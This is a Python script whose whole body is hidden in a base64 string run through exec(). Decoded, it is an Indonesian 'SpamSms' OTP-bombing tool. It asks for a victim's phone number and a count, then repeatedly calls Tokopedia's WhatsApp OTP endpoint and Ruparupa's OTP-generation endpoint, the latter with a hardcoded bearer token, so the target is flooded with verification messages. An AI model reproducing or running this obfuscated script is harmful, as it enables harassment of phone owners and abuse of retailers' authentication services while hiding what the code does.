import base64 
exec(base64.b64decode('IyEvdXNyL2Jpbi9weXRob24yCiNBZGlhcmFhYQojMDg3CiNOYXJrb2JveQpmcm9tIHJlcXVlc3RzIGltcG9ydCBDb25uZWN0aW9uRXJyb3IKZnJvbSB0aW1lIGltcG9ydCBzbGVlcAppbXBvcnQgcmVxdWVzdHMsIHN5cywgb3MsIHJlLCByYW5kb20KCm9zLnN5c3RlbSgnY2xlYXInKQoKTSA9ICdcMDMzWzE7MzFtJwpIID0gJ1wwMzNbMTszMm0nCksgPSAnXDAzM1sxOzMzbScKVSA9ICdcMDMzWzE7MzRtJwpQID0gJ1wwMzNbMTszNW0nCkMgPSAnXDAzM1sxOzM2bScKVyA9ICdcMDMzWzE7MzdtJwpBID0gJ1wwMzNbOTBtJwojIGNvZGUgd2FybmEKcHV0aWg9IlwwMzNbMTszN20iCmJpcnU9IlwwMzNbMTs5Nm0iCmt1bmluZz0iXDAzM1sxOzkzbSIKbWVyYWg9IlwwMzNbMTs5MW0iCmhpamF1PSJcMDMzWzE7OTJtIgphYnUyPSJcMDMzWzE7OTBtIgp1bmd1PSJcMDMzWzE7OTVtIgpiaXJ1dHVhPSJcMDMzWzE7MzRtIgpkZWYgTWVzaW5UaWsodGV4dCk6Cglmb3IgeCBpbiB0ZXh0ICsgJ1xuJzoKCQlzeXMuc3Rkb3V0LndyaXRlKHgpCgkJc3lzLnN0ZG91dC5mbHVzaCgpCgkJc2xlZXAocmFuZG9tLnJhbmRvbSgpICogMC4wNSkKCQpkZWYgTWVzaW5UaWtfMih0ZXh0KToKCWZvciB4IGluIHRleHQgKyAnXG4nOgoJCXN5cy5zdGRvdXQud3JpdGUoeCkKCQlzeXMuc3Rkb3V0LmZsdXNoKCkKCQlzbGVlcChyYW5kb20ucmFuZG9tKCkgKiAwLjAxKQoJCmRlZiBCYW5uZXIoKToKCU1lc2luVGlrXzIoJycrQysnJycKIF9fX18gICAgICAgICAgICAgICAgICAgICAgICBfX19fICAgICAgICAgICAgICAgICAgICAgICAKLyBfX198IF8gX18gICBfXyBfIF8gX18gX19fIC8gX19ffCBfIF9fIF9fXyAgX19fICAgICAgICAKXF9fXyBcfCAnXyBcIC8gX2AgfCAnXyBgIF8gXFxcX19fIFx8ICdfIGAgXyBcLyBfX3wgICAgICAgCiBfX18pIHwgfF8pIHwgKF98IHwgfCB8IHwgfCB8X19fKSB8IHwgfCB8IHwgXF9fIFwgICAgICAgCnxfX19fL3wgLl9fLyBcX18sX3xffCB8X3wgfF98X19fXy98X3wgfF98IHxffF9fXy8gICAgICAgCiAgICAgIHxffCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAnJycrYmlydXR1YSsnIENyZWF0b3IgOiBBZGlyYWFhLTA4NycpCglNZXNpblRpa18yKCcnK1crJycnICBUZWFtIDogQ3liZXIgQmVnaW5uZXIgSU5ET05FU0lBCiAnJycrTSsnPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0nKQogICAgICAgICAgICAgICAgICAgCmRlZiBSdXBhUnVwYSgpOgoJcHJpbnQKCU1lc2luVGlrKEMrJ1x0IFNQQU0gUlVQQSBSVVBBJykKCU1lc2luVGlrKFcrJ1x0PT09PT09PT09PT09PT09PScpCglwcmludAoJbnVtYmVyID0gcmF3X2lucHV0KCcnK0MrJ01BU1VLS0FOIE5PTU9SIFRBUkdFVCcrVysnICgnK0grJyBFeCA6JytDKycgMDgxMnh4eHggJytXKycpIDogJykKCWp1bWxhaCA9IGlucHV0KCcnK0MrJ0pVTUxBSCBTUEFNJytXKycgKCcrSCsnIEV4IDonK0MrJyAzICcrVysnKSA6ICcpCglwcmludAoJTWVzaW5UaWtfMignJytDKyctLS0tLS0tLS0tLS0tLSAnK1crJ1N0YXJ0aW5nJytDKycgLS0tLS0tLS0tLS0tLS0nKQoJcHJpbnQKCWhpdHVuZyA9IGxlbihudW1iZXIpCgkKCWlmIGhpdHVuZyA8IDk6CgkJcHJpbnQKCQlwcmludChNKydOb21vciBUaWRhayBWYWxpZCAhJykKCQlzeXMuZXhpdCgpCgkKCWZvciB4IGluIHJhbmdlKGp1bWxhaCk6CgkJdHJ5OgoJCQkKCQkJaGVhZGVyc18xID0gewoJCQkKCQkJJ1VzZXItQWdlbnQnIDogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA1LjEuMTsgQUZUVCBCdWlsZC9MVlk0OEY7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvNDkuMC4yNjIzLjEwJywKCQkJJ0FjY2VwdCcgOiAnYXBwbGljYXRpb24vanNvbicsCgkJCSdPcmlnaW4nIDogJ2h0dHBzOi8vbS5ydXBhcnVwYS5jb20nLAoJCQknUmVmZXJlcicgOiAnaHR0cHM6Ly9tLnJ1cGFydXBhLmNvbS9teS1hY2NvdW50JywKCQkJJ2F1dGhvcml6YXRpb24nIDogJ2V5SmhiR2NpT2lKSVV6STFOaUlzSW5SNWNDSTZJa3BYVkNKOS5leUoxZFdsa0lqb2lZak16WlRrNU5qY3RNamRoTXkwMFpqa3hMV0UyTTJNdE0yTTROek15WlRaaE9UVTJJaXdpYVdGMElqb3hOVGd3TmpNMk9ESTBMQ0pwYzNNaU9pSjNZWEJwTG5KMWNHRnlkWEJoSW4wLnBDOUVEeV83OUdJRGQ0Tk9KS1pQMmtINUVqUGRVSzVWR1VuNTlDenNkRzAnLAoJCQkneC1jb21wYW55LW5hbWUnIDogJ29kaScKCQkJCgkJCX0KCQkJCgkJCWRhdGFfMSA9IHsKCQkJCgkJCSdwaG9uZScgOiBudW1iZXIsCgkJCSdlbWFpbCcgOiAnamVqYWtAZ21haWwuY29tJywKCQkJJ2FjdGlvbicgOiAncmVnaXN0ZXInLAoJCQkncGFzc3dvcmQnIDogJycKCQkJCgkJCX0KCQkJCgkJCWhlYWRlcnNfMiA9IHsKCQkJCgkJCSdhdXRob3JpemF0aW9uJyA6ICdleUpoYkdjaU9pSklVekkxTmlJc0luUjVjQ0k2SWtwWFZDSjkuZXlKMWRXbGtJam9pWWpNelpUazVOamN0TWpkaE15MDBaamt4TFdFMk0yTXRNMk00TnpNeVpUWmhPVFUySWl3aWFXRjBJam94TlRnd05qTTJPREkwTENKcGMzTWlPaUozWVhCcExuSjFjR0Z5ZFhCaEluMC5wQzlFRHlfNzlHSURkNE5PSktaUDJrSDVFalBkVUs1VkdVbjU5Q3pzZEcwJywKCQkJJ3gtY29tcGFueS1uYW1lJyA6ICdvZGknLCAKCQkJJ1VzZXItQWdlbnQnIDogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA1LjEuMTsgQUZUVCBCdWlsZC9MVlk0OEY7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvNDkuMC4yNjIzLjEwJywKCQkJJ09yaWdpbicgOiAnaHR0cHM6Ly9tLnJ1cGFydXBhLmNvbScsCgkJCSdyZWZlcmVyJyA6ICdodHRwczovL20ucnVwYXJ1cGEuY29tL3ZlcmlmaWNhdGlvbj9wYWdlPW90cC1jaG9pY2VzJywKCQkJJ2FjY2VwdC1lbmNvZGluZycgOiAnZ3ppcCwgZGVmbGF0ZSwgYnInIAoJCQkKCQkJfQoJCQkKCQkJZGF0YV8yID0gewoJCQkKCQkJJ3Bob25lJyA6IG51bWJlciwKCQkJJ2FjdGlvbicgOiAncmVnaXN0ZXInLAoJCQknY2hhbm5lbCcgOiAnY2hhdCcsCgkJCSdlbWFpbCcgOiAnJywKCQkJJ2N1c3RvbWVyX2lkJyA6ICcwJywKCQkJJ2lzX3Jlc2VuZCcgOiAwCgkJCQoJCQl9CgkJCQoJCQl1cmxfMSA9ICdodHRwczovL3dhcGkucnVwYXJ1cGEuY29tL2F1dGgvY2hlY2stb3RwLWF1dGgnCgkJCXVybF8yID0gJ2h0dHBzOi8vd2FwaS5ydXBhcnVwYS5jb20vYXV0aC9nZW5lcmF0ZS1vdHAnCgkJCQoJCQlzZW5kaW5nXzEgPSByZXF1ZXN0cy5wb3N0KHVybF8xLCBoZWFkZXJzID0gaGVhZGVyc18xLCBkYXRhID0gZGF0YV8xKQoJCQlzZW5kaW5nXzIgPSByZXF1ZXN0cy5wb3N0KHVybF8yLCBoZWFkZXJzID0gaGVhZGVyc18yLCBkYXRhID0gZGF0YV8yKQoJCQkKCQkJaWYgJ3R1bmdndSAxeDI0IGphbScgaW4gc2VuZGluZ18yLnRleHQ6CgkJCQlwcmludAoJCQkJcHJpbnQoJycrVysnUGVuZ2lyaW1hbiBTdWRhaCBMaW1pdFxuU2lsYWhrYW4gQ29iYSAxIHggMjQgSmFtIExhZ2kgOiknKQoJCQkJYnJlYWsKCQkJCQoJCQllbHNlOgoJCQkJcHJpbnQoJycrQysnWycrVysnKicrQysnXScrVysnIFNQQU0gS0UgTk9NT1IgJytDK251bWJlcitXKycgQkVSSEFTSUwgRElLSVJJTUtBTiAhJykKCQkKCQlleGNlcHQgQ29ubmVjdGlvbkVycm9yOgoJCQlwcmludAoJCQlwcmludChNKydDZWsgS29uZWtzaSBKYXJpbmdhbk11ICEnKQoJCQlicmVhawoJCQoJCWV4Y2VwdCBOYW1lRXJyb3I6CgkJCXByaW50CgkJCXByaW50KE0rJ0p1bWxhaCBIYXJ1cyBCZXJ1cGEgQW5na2EsIEJ1a2FuIEh1cnVmICEnKQoJCQlicmVhawoJCQkKCmRlZiBUb2twZWQoKToKCXByaW50CglNZXNpblRpayhDKydcdCBTUEFNIFRPS09QRURJQScpCglNZXNpblRpayhXKydcdD09PT09PT09PT09PT09PT0nKQoJcHJpbnQKCW51bWJlciA9IHJhd19pbnB1dCgnJytDKydNQVNVS0tBTiBOT01PUiBUQVJHRVQnK1crJyAoJytIKycgRXggOicrQysnIDA4MTJ4eHh4ICcrVysnKSA6ICcpCglqdW1sYWggPSBpbnB1dCgnJytDKydKVU1MQUggU1BBTScrVysnICgnK0grJyBFeCA6JytDKycgMyAnK1crJykgOiAnKQoJcHJpbnQKCU1lc2luVGlrXzIoJycrQysnLS0tLS0tLS0tLS0tLS0gJytXKydTdGFydGluZycrQysnIC0tLS0tLS0tLS0tLS0tJykKCXByaW50Cglmb3IgeCBpbiByYW5nZShqdW1sYWgpOgoJCXRyeToKCQkJCgkJCWhlYWRlcnMgPSB7CgkJCQoJCQknQ29ubmVjdGlvbicgOiAna2VlcC1hbGl2ZScsCgkJCSdBY2NlcHQnIDogJ2FwcGxpY2F0aW9uL2pzb24sIHRleHQvamF2YXNjcmlwdCwgKi8qOyBxPTAuMDEnLAoJCQknT3JpZ2luJyA6ICdodHRwczovL2FjY291bnRzLnRva29wZWRpYS5jb20nLAoJCQknWC1SZXF1ZXN0ZWQtV2l0aCcgOiAnWE1MSHR0cFJlcXVlc3QnLAoJCQknVXNlci1BZ2VudCcgOiAne2FjYWt9JywKCQkJJ0NvbnRlbnQtVHlwZScgOiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04JywKCQkJJ0FjY2VwdC1FbmNvZGluZycgOiAnZ3ppcCwgZGVmbGF0ZScsCgkJCQoJCQl9IAoJCQkKCQkJc2l0ZSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9hY2NvdW50cy50b2tvcGVkaWEuY29tL290cC9jL3BhZ2U/b3RwX3R5cGU9MTE2Jm1zaXNkbj0nK251bWJlcisnJmxkPWh0dHBzJTNBJTJGJTJGYWNjb3VudHMudG9rb3BlZGlhLmNvbSUyRnJlZ2lzdGVyJTNGdHlwZSUzRHBob25lJTI2cGhvbmUlM0R7fSUyNnN0YXR1cyUzRGV5SnJJanAwY25WbExDSnRJanAwY25WbExDSnpJanBtWVd4elpTd2lZbTkwSWpwbVlXeHpaU3dpWjJNaU9tWmhiSE5sZlElMjUzRCUyNTNEJywgaGVhZGVycyA9IGhlYWRlcnMpLnRleHQKCQkJc2VhcmNoID0gcmUuc2VhcmNoKHInXDxpbnB1dFwgaWRcPVwiVG9rZW5cIlwgdmFsdWVcPVwiKC4qPylcIlwgdHlwZVw9XCJoaWRkZW5cIlw+Jywgc2l0ZSkuZ3JvdXAoMSkKCQkJCgkJCWRhdGEgPSB7CgkJCQoJCQknb3RwX3R5cGUnIDogJzExNicsCgkJCSdtc2lzZG4nIDogbnVtYmVyLAoJCQkndGsnIDogc2VhcmNoLAoJCQknZW1haWwnIDogJycsCgkJCSdvcmlnaW5hbF9wYXJhbScgOiAnJywKCQkJJ3VzZXJfaWQnIDogJycsCgkJCSdzaWduYXR1cmUnIDogJycsCgkJCSdudW1iZXJfb3RwX2RpZ2l0JyA6ICc2JywKCQkJCgkJCX0gCgkJCQoJCQlzbGVlcCgzMCkgIyBKYW5nYW4gRGkgUnViYWggTmlsYWkgU2xlZXBueWEsIEl0dSBVZGFoIERlZmF1bHQuCgkJCQoJCQlzZW5kaW5nID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9hY2NvdW50cy50b2tvcGVkaWEuY29tL290cC9jL2FqYXgvcmVxdWVzdC13YScsIGhlYWRlcnMgPSBoZWFkZXJzLCBkYXRhID0gZGF0YSkKCQkJCQoJCQlpZiAnQW5kYSBzdWRhaCBtZWxha3VrYW4gMyBrYWxpIHBlbmdpcmltYW4ga29kZScgaW4gc2VuZGluZy50ZXh0OgoJCQkJcHJpbnQKCQkJCXByaW50KCcnK1crJ1BlbmdpcmltYW4gU3VkYWggTGltaXRcblNpbGFoa2FuIENvYmEgMjUgLSA2MCBNZW5pdCBMYWdpIDopJykKCQkJCWJyZWFrCgkJCQkKCQkJZWxzZToKCQkJCXByaW50KCcnK0MrJ1snK1crJyonK0MrJ10nK1crJyBTUEFNIEtFIE5PTU9SICcrQytudW1iZXIrVysnIEJFUkhBU0lMIERJS0lSSU1LQU4gIScpCgkJCQkKCQlleGNlcHQgQ29ubmVjdGlvbkVycm9yOgoJCQlwcmludAoJCQlwcmludChNKydDZWsgS29uZWtzaSBKYXJpbmdhbk11ICEnKQoJCQlicmVhawoJCQoJCWV4Y2VwdCBOYW1lRXJyb3I6CgkJCXByaW50CgkJCXByaW50KE0rJ0p1bWxhaCBIYXJ1cyBCZXJ1cGEgQW5na2EsIEJ1a2FuIEh1cnVmICEnKQoJCQlicmVhawogICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAKZGVmIFNwYW0oKToKCW9zLnN5c3RlbSgnY2xlYXInKQoJc2xlZXAoMS4zKQogICAgICAgIE1lc2luVGlrXzIoJycrQysnJycKX18gICAgICAgIF9fICAgXwpcIFwgICAgICAvIC9fX3wgfCBfX18gX19fICBfIF9fIF9fXyAgIF9fXyAgICAgICAgICAgCiBcIFwgL1wgLyAvIF8gXCB8LyBfXy8gXyBcfCAnXyBgIF8gXCAvIF8gXCAgICAgICAgICAKICBcIFYgIFYgLyAgX18vIHwgKF98IChfKSB8IHwgfCB8IHwgfCAgX18vICAgICAgICAgIAogICBcXy9cXy8gXF9fX3xffFxfX19cX19fL3xffCB8X3wgfF98XF9fX3wgICAgICAgICAgCiAnJycrTSsnX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fJykKCgoJcHJpbnQKICAgICAgICBNZXNpblRpayhXKycgIFNlbGFtYXQgRGF0YW5nIERpIFRvb2xzIEFkaWFyYWFhLTA4NycpCglzbGVlcCgzKQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQoJQmFubmVyKCkKCXByaW50CglwcmludAoJcHJpbnQoQysnTUVOVScrVysnIDonKQoJcHJpbnQoQysnXHRbJytXKycxJytDKyddJytXKycgU1BBTSBUT0tPUEVESUEnK0MrJyAoICcrSCsnQWt0aWYnK0MrJyApJykKCXByaW50KEMrJ1x0WycrVysnMicrQysnXScrVysnIFNQQU0gUlVQQS1SVVBBJytDKycgKCAnK00rJ05vbkFrdGlmJytDKycgKScpCglwcmludAoJCgl0cnk6CgkJCgkJcGlsaWggPSBpbnB1dCgnUElMSUggTUVOVScrVysnIFx4RTJceDlFXHhBNCAnK0MrJycpCgkJaWYgcGlsaWggPT0gMToKCQkJVG9rcGVkKCkgCgkJZWxpZiBwaWxpaCA9PSAyOgoJCQlSdXBhUnVwYSgpCgkJZWxzZToKCQkJcGFzcwoJCQkKCWV4Y2VwdCBOYW1lRXJyb3I6CgkJcHJpbnQKCQlwcmludChNKydQaWxpaCBNZW51IEhhcnVzIEJlcnVwYSBBbmdrYSwgQnVrYW4gSHVydWYgIScpCgkJc3lzLmV4aXQoKQoJCQkKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKCVNwYW0oKQo='))